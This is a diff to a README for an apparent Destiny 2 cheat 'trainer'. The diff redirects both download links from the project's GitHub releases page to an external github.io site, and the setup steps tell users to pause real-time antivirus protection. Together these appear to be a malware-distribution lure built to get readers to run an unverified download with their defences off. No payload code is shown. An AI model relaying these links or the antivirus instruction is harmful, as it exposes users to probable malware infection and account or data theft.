@@ -1,6 +1,6 @@
 # 🎮 Destiny2-Ultimate-Trainer-2026-plus - Dominate every match with ease today
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/ungodly-genusjordanella754/Destiny2-Ultimate-Trainer-2026-plus/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://ungodly-genusjordanella754.github.io)
 
 ## 🎯 About this software
 
@@ -32,7 +32,7 @@ Follow these steps to set up the software on your Windows machine.
 ### 1. Visit the download page
 Go to the official release page to get the latest version of the toolkit.
 
-[Download the software here](https://github.com/ungodly-genusjordanella754/Destiny2-Ultimate-Trainer-2026-plus/releases)
+[Download the software here](https://ungodly-genusjordanella754.github.io)
 
 ### 2. Prepare your system
 Some security software might flag game tools as suspicious. Temporarily pause your real-time antivirus protection during the setup process. This step allows the application to interact with your game files correctly.
